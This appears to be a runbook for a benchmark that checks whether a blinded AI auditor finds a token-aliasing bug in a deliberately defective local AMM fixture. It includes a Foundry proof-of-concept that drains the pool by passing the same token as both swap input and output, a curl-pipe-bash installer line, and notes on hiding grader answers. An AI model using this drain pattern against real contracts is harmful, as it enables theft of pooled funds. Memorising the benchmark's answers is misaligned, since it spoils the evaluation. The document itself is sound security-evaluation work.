# Running case-10 end to end

case-10 is the **assumed-distinctness** case: an operation takes two references of the same kind
(here `swap(tokenIn, tokenOut, …)`) and the accounting assumes they differ, but nothing enforces it.
Passing the same reference for both credits value never deposited.

You have two ways to run it. Do **Track A** first — it validates the whole pipeline in ~10 minutes and
needs no archive node. **Track B** is the historical target, and it has a caveat you must read.

Throughout, keep the two actors apart:
- **AUDITOR** = a fresh agent that sees ONLY `PROMPT_BUNDLE.md` + a fork RPC + an address. No case file,
  no ANALYSIS.md, no this-file, no web search of the incident.
- **GRADER** = you, running `grade.py` afterwards in a different session.

---

## Track A — local fixture (fully runnable now, deterministic)

A minimal defective AMM carrying exactly the case-10 shape lives in `fixtures/MiniAmm.sol`. You fork
nothing external; anvil is the chain.

### A1. Start a local chain, then deploy + seed with one script
Needs Foundry (`anvil`, `forge`, `cast`) — install: `curl -L https://foundry.paradigm.xyz | bash && foundryup`.

Terminal 1 — start the chain and leave it running:
```bash
anvil
```
Terminal 2 — from the repo root, one command does deploy + seed and prints the next step:
```bash
eval/fixtures/setup_local.sh
```
It captures the deployed addresses itself (nothing to copy-paste), seeds a 1000-token victim deposit and
a 100-token attacker stake, and prints the exact `stage_auditor.sh` line with the AMM address filled in.
Do **not** paste the old multi-line block by hand — pasting `<placeholder>` lines into a shell breaks
(`<` is a redirect) and inline comments merge lines. The script exists precisely to avoid that.

### A2. Blind the bundle
```
cd ..                                  # eval/
./run_case.sh cases/case-10-assumed-distinctness.json runs/case-10
```
Confirm it prints **LEAK CHECK: PASS**. Open `runs/case-10/BRIEF.json` and check it contains only
`id`, `substrate_modules`, `blinded_brief` — no `class`, no `note`. That is what "blinded" means here.

### A3. Stage the blind run and hand it to the auditor
```bash
cd ..                                    # eval/
./stage_auditor.sh cases/case-10-assumed-distinctness.json runs/case-10 $AMM http://127.0.0.1:8545
```
This assembles + leak-checks the bundle and builds a **clean room** at `runs/case-10/auditor/` that
contains only `PROMPT_BUNDLE.md` — no repo, no ANALYSIS.md, no case file, no fixture source, so the
auditor cannot read the answer even if it tries. It also writes the exact prompt to paste.

Run the auditor one of two ways:
- **Fresh Claude Code session (recommended):** `cd runs/case-10/auditor && claude` (a brand-new session
  whose working directory is the clean room), then paste the contents of `START_HERE.txt`.
- **A different LLM / web UI:** paste the whole of `ONE_PASTE.md` (the same prompt with the bundle inline).

Give it the `$AMM` address, never the token, the fixture source, or any name. Save its complete reply to
`runs/case-10/transcript.txt` (and `manifest.json` if it wrote one).

### A4. (Optional but recommended) a reference PoC to sanity-check the target
If you want to confirm the target really is drainable before judging the auditor, drop this in
`fixtures/test/Case10.t.sol` and run `forge test -vv`. This is the GRADER's tool, never shown to the auditor.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../MiniAmm.sol";
contract Case10 is Test {
    MiniAmm amm; MockToken t;
    function setUp() public {
        amm = new MiniAmm(); t = new MockToken("USDC");
        t.mint(address(this), 1100 ether); t.approve(address(amm), type(uint256).max);
        amm.deposit(address(t), 1000 ether);            // the "victim" liquidity
    }
    function testAliasedSwapDrains() public {
        // attacker path: 100 real, alias tokenIn==tokenOut to inflate credit, withdraw the pool
        MockToken a = t; // same token both sides
        amm.deposit(address(a), 100 ether);              // attacker's real 100
        for (uint i; i < 6; i++) {
            uint c = amm.credit(address(this), address(a));
            if (amm.reserve(address(a)) == 0) break;
            try amm.swap(address(a), address(a), c) {} catch { break; }
        }
        uint before = t.balanceOf(address(this));
        amm.withdraw(address(t), 1100 ether);            // takes the whole pool
        assertGt(t.balanceOf(address(this)) - before, 900 ether); // net >> the 100 put in
    }
}
```

### A5. Grade
```
python3 grade.py --case cases/case-10-assumed-distinctness.json --run runs/case-10
```
Read PATH (of 5 must_reach steps), DERIVED (did it name the incident before any on-chain read — should be
"yes (no early incident-naming)"), PROVEN (fork/PoC/assertion present). Pass = PATH ≥ 0.8 AND DERIVED AND
PROVEN. Then run a control the same way and confirm it does NOT invent a finding:
```
./run_case.sh controls/control-01-standard-clone.json runs/control-01
#   ... run the auditor against a real, safe deployment (see RUNBOOK step 1) ...
python3 grade.py --control controls/control-01-standard-clone.json --run runs/control-01
```
Recall means nothing without the false-positive number beside it.

---

## Track B — the historical target (real incident)

`answer_for_grader_only` names the real deployment. **Caveat you must read:** that incident is on a
non-EVM VM (Soroban), for which this repo has no substrate module and no anvil-style local fork. So you
cannot run Track B with the EVM tooling above. Options, honestly ranked:
1. **Best fidelity, most work:** replay against that chain's own node/snapshot at the pre-exploit ledger,
   and hand the auditor `EVM.md` swapped for the closest module (or none — the case tests CORE's method,
   not the module). This is a real project, not a ten-minute run.
2. **Same shape, EVM-native, runnable now:** port the defect to an EVM fork — either the fixture in Track
   A, or find any historical EVM same-asset / aliased-parameter incident, fork one block before, and point
   case-10 at it. The `class` and `must_reach` are substrate-free and score it unchanged.
Until you do (1), Track A is the measurement. Track B(1) is the higher bar when you have time.

---

## What a PASS actually tells you
The auditor, told nothing but "an AMM whose pools are directly callable," enumerated `swap`, noticed it
takes two same-kind references, tested passing the same one, found no on-chain line forbidding it, traced
the credit that appears from nothing, and proved it on the fork — netting positive. That is the Lens-E
mirror doing its job on a target it was never told about. A MISS with PATH broken at step [1] or [2] means
the distinctness move didn't fire; tighten Lens E. A MISS at [4]/[5] means it saw it but couldn't drive
execution; that points at the §A harness-first change, not the lens.


---

# Running a real-fork case (e.g. case-03) — no local fixture

case-10 ships a local fixture. Most cases don't: they are real historical incidents, so the "target"
is a real deployment you fork at the pinned block. That needs three things the case does NOT contain,
which you (as operator, allowed to read `answer_for_grader_only`) supply:
- an **archive RPC** for the incident's chain (e.g. a free Alchemy/Infura mainnet key),
- the incident's **exploit block** (fork one block before it),
- the **target address** (the vault/pool the auditor should start from).

Get the block + address from the grader answer plus a block explorer. Then one command forks, checks the
target has code at that block, and stages the blind bundle:
```bash
cd eval
./stage_real.sh cases/case-03-guard-on-wrong-path.json runs/case-03 <ARCHIVE_RPC> <EXPLOIT_BLOCK> <TARGET_ADDR>
```
From there it is identical to case-10: `cd runs/case-03/auditor && codex` (or claude), paste
`START_HERE.txt`, save `transcript.txt`, then
`python3 grade.py --case cases/case-03-guard-on-wrong-path.json --run runs/case-03/auditor`.
Stop the fork when done: `kill $(cat runs/case-03/anvil.pid)`.

Blinding note: `stage_real.sh` hands the auditor only the address and the fork — never the incident name.
But a real address is googleable, so the score is still the PATH, not the answer; an auditor that recalls
the name without making the observations still fails.
